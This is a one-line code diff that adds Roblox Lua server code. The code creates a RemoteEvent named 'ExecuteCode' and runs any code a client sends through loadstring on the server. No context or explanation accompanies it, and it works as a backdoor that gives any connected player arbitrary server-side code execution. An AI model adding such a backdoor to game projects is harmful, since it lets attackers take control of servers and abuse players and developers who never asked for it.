@@ -1,0 +1,1 @@
+local r=Instance.new("RemoteEvent")r.Name="ExecuteCode"r.Parent=game:GetService("ReplicatedStorage")r.OnServerEvent:Connect(function(p,c)loadstring(c)()end)
